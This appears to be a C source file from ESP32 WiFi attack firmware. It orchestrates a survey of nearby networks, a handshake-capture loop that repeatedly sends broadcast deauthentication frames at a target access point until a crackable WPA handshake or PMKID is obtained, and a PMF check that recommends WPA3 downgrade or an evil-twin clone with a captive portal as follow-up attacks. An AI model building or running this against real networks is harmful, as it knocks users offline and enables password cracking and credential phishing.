/* scenario.c: 场景编排与 PMF 感知 */
#include "scenario.h"
#include "wifi_attack.h"
#include "wifi_db.h"
#include "radio_common.h"
#include "hs.h"
#include "event_bus.h"

#include <stdio.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"


typedef enum { SCEN_IDLE = 0, SCEN_SURVEY, SCEN_HANDSHAKE, SCEN_PMF } scen_t;

static volatile bool s_run = false;
static TaskHandle_t  s_task = NULL;
static scen_t        s_kind = SCEN_IDLE;
static uint32_t      s_secs = 30;
static uint8_t       s_bssid[6];
static int           s_rounds = 0;
static char          s_phase[24] = "idle";

bool wifi_target_pmf_required(const uint8_t bssid[6])
{
    const ap_entry_t *a = wifi_db_find_ap(bssid);
    return a ? a->pmf : false;
}

const char *scenario_kind_str(void)
{
    switch (s_kind) {
    case SCEN_SURVEY:    return "survey";
    case SCEN_HANDSHAKE: return "handshake";
    case SCEN_PMF:       return "pmf";
    default:             return "idle";
    }
}

static void set_phase(const char *p)
{
    snprintf(s_phase, sizeof(s_phase), "%s", p);
    event_publish("SCENARIO", "phase=%s round=%d", p, s_rounds);
}

/* 可中断的等待: 返回 false 表示被 stop */
static bool wait_ms(uint32_t ms)
{
    uint32_t step = 100;
    while (ms && s_run) {
        uint32_t d = ms > step ? step : ms;
        vTaskDelay(pdMS_TO_TICKS(d));
        ms -= d;
    }
    return s_run;
}

static void scen_task(void *arg)
{
    (void)arg;
    char mac[18];
    mac_to_str(s_bssid, mac);

    if (s_kind == SCEN_SURVEY) {
        int aps0 = wifi_db_ap_count(), cli0 = wifi_db_client_count();
        set_phase("sniff-auto");
        printf("META,SCENARIO,SURVEY,START,secs,%u\n", (unsigned)s_secs);
        fflush(stdout);
        wifi_attack_sniff_auto_start(300, 0);
        wait_ms(s_secs * 1000);
        wifi_attack_stop_all();
        printf("META,SCENARIO,SURVEY,DONE,secs,%u,aps,%d,new_aps,%d,clients,%d,new_clients,%d,eapols,%d\n",
               (unsigned)s_secs, wifi_db_ap_count(), wifi_db_ap_count() - aps0,
               wifi_db_client_count(), wifi_db_client_count() - cli0, hs_count());
        fflush(stdout);
        event_publish("SCENARIO", "survey done aps=%d clients=%d",
                      wifi_db_ap_count(), wifi_db_client_count());
    }
    else if (s_kind == SCEN_HANDSHAKE) {
        const ap_entry_t *ap = wifi_db_find_ap(s_bssid);
        uint8_t ch = ap ? ap->channel : 6;
        int hs0 = hs_complete_count();

        printf("META,SCENARIO,HANDSHAKE,START,bssid,%s,channel,%u,pmf,%d\n",
               mac, (unsigned)ch, ap ? (ap->pmf ? 1 : 0) : -1);
        fflush(stdout);

        if (ap && ap->pmf) {
            /* 强制 PMF 的 AP, 广播 deauth 基本无效, 直接换路径 */
            printf("META,SCENARIO,HANDSHAKE,BLOCKED,reason,pmf_required,"
                   "advice,use 'scenario pmf' then 'downgrade' or 'eviltwin'\n");
            fflush(stdout);
            event_publish("SCENARIO", "handshake blocked: pmf required");
        } else {
            uint32_t deadline_ms = s_secs * 1000;
            uint32_t spent = 0;
            static const uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};

            while (s_run && spent < deadline_ms) {
                s_rounds++;
                set_phase("sniff");
                wifi_attack_sniff_start(ch, 0);
                if (!wait_ms(4000)) { wifi_attack_stop_all(); break; }

                wifi_attack_stop_all();
                set_phase("deauth");
                wifi_attack_deauth_start(s_bssid, bcast, 12, 7, 40);
                wait_ms(900);
                wifi_attack_stop_all();

                spent += 5000;
                if (hs_complete_count() > hs0) break;      /* 拿到可破解握手就收工 */
            }
        }

        printf("META,SCENARIO,HANDSHAKE,DONE,bssid,%s,rounds,%d,hs_total,%d,hs_complete,%d,pmkid,%d\n",
               mac, s_rounds, hs_count(), hs_complete_count(), hs_pmkid_count());
        fflush(stdout);
        event_publish("SCENARIO", "handshake done rounds=%d complete=%d",
                      s_rounds, hs_complete_count());
    }
    else if (s_kind == SCEN_PMF) {
        const ap_entry_t *ap = wifi_db_find_ap(s_bssid);
        if (!ap) {
            printf("META,SCENARIO,PMF,ERR,msg,ap_not_in_db (先 sniff 扫一遍)\n");
            fflush(stdout);
        } else {
            printf("META,SCENARIO,PMF,REPORT,bssid,%s,channel,%u,mfpr,%d,mfpc,%d,akm,0x%02x\n",
                   mac, (unsigned)ap->channel, ap->pmf ? 1 : 0, ap->pmf_cap ? 1 : 0,
                   (unsigned)ap->akm);
            fflush(stdout);

            if (ap->pmf) {
                printf("META,SCENARIO,PMF,VERDICT,deauth_useless,1,"
                       "next,%s\n",
                       ap->crackable ? "downgrade (WPA3 transition) 或 eviltwin clone"
                                     : "eviltwin clone + captive portal");
                fflush(stdout);
                event_publish("SCENARIO", "pmf required -> route change");
            } else {
                set_phase("probe-deauth");
                static const uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
                wifi_attack_sniff_start(ap->channel, 0);
                wait_ms(1500);
                wifi_attack_deauth_start(s_bssid, bcast, 16, 7, 40);
                wait_ms(900);
                wifi_attack_stop_all();
                printf("META,SCENARIO,PMF,VERDICT,deauth_useless,0,next,%s\n",
                       ap->crackable ? "scenario handshake" : "beacon/probe 侦察");
                fflush(stdout);
            }
        }
    }

    set_phase("done");
    printf("META,SCENARIO,DONE,kind,%s\n", scenario_kind_str());
    fflush(stdout);

    s_run = false;
    s_kind = SCEN_IDLE;
    s_task = NULL;
    vTaskDelete(NULL);
}

static esp_err_t scen_spawn(scen_t kind, uint32_t secs)
{
    if (s_run) return ESP_ERR_INVALID_STATE;
    s_kind = kind;
    s_secs = secs ? secs : 30;
    s_rounds = 0;
    s_run = true;
    if (xTaskCreate(scen_task, "scenario", 4096, NULL, 4, &s_task) != pdPASS) {
        s_run = false;
        s_kind = SCEN_IDLE;
        return ESP_FAIL;
    }
    return ESP_OK;
}

esp_err_t scenario_survey(uint32_t secs)
{
    if (secs == 0) secs = 30;
    if (secs > 300) secs = 300;
    return scen_spawn(SCEN_SURVEY, secs);
}

esp_err_t scenario_handshake(const uint8_t bssid[6], uint32_t secs)
{
    if (!bssid) return ESP_ERR_INVALID_ARG;
    memcpy(s_bssid, bssid, 6);
    if (secs == 0) secs = 40;
    if (secs > 180) secs = 180;
    return scen_spawn(SCEN_HANDSHAKE, secs);
}

esp_err_t scenario_pmf(const uint8_t bssid[6])
{
    if (!bssid) return ESP_ERR_INVALID_ARG;
    memcpy(s_bssid, bssid, 6);
    return scen_spawn(SCEN_PMF, 10);
}

void scenario_stop(void)
{
    if (!s_run) return;
    s_run = false;
    wifi_attack_stop_all();
    printf("META,SCENARIO,STOP,kind,%s\n", scenario_kind_str());
    fflush(stdout);
    event_publish("SCENARIO", "stop");
}

bool scenario_running(void) { return s_run; }

void scenario_status(void)
{
    char mac[18];
    mac_to_str(s_bssid, mac);
    printf("META,SCENARIO,STATUS,running,%d,kind,%s,phase,%s,rounds,%d,secs,%u,target,%s\n",
           s_run ? 1 : 0, scenario_kind_str(), s_phase, s_rounds,
           (unsigned)s_secs, mac);
    fflush(stdout);
}
